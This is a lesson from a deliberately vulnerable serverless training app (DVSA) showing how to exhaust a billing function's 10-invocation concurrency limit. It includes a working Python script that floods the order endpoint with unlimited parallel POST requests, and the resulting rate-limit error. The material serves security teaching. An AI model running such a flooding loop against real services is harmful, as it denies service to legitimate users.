# LESSON #6: Denial of Service (DoS)

To avoid flooding the 3rd party payment processing (its not really 3rd-party, but think about it as a STIPE) the DVSA is configured to allow only 10 concurrent invocation of the billing processing.

This means that an attacker can cause a Denial of Service on the payment processing in the applicaiton, simply by sending the billing request in at least 10 parallel threads.

This simply python code will exploit it (with sample data):
```
import threading
import requests

def dos():
    payload = '{ "action":"billing", "order-id": "9f51b1e1-eff9-4dc1-8e17-7ee19ba51272", "data": {"ccn": "4242424242424242", "exp": "11/2020", "cvv": "444"} }'
    url = "https://qz0yy61905.execute-api.us-east-1.amazonaws.com/dev/order"
    headers = {"Authorization": "eyJraWQiOiIyQ1dZekh0dTV..............BVVplWk9qenw"}

    r = requests.post(url, data=payload, headers=headers)
    print (r.text)
    return


while True:
    threading.Thread(target=dos).start()

```

As a result, any other user that will try to invoke this service will receice:
```
{
  "message": "Rate Exceeded.",
  "code": "TooManyRequestsException",
  "time": "2018-12-22T23:25:29.935Z",
  "requestId": "deec6aa7-0640-11e9-9e02-a529a60fefd1",
  "statusCode": 429,
  "retryable": false,
  "retryDelay": 17.57835303415325
}
```
